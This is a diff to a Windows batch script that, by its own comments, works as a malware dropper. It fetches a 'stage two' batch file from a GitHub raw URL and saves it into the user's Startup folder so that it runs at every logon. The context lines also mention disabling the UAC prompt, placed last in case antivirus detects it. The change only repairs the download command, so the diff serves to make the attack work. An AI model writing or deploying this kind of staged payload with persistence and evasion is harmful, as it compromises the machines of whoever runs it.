@@ -97,7 +97,8 @@ endlocal
 :: Downloads stage two, puts in startup
 :: ========================================================================
 
-curl --ssl-no-revoke -o C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\stage2.bat https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/stagetwo.bat
+cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/bat/stagetwo.bat
 
 :: ========================================================================
 :: Disabling UAC prompt (saved for last just in case AV detects)
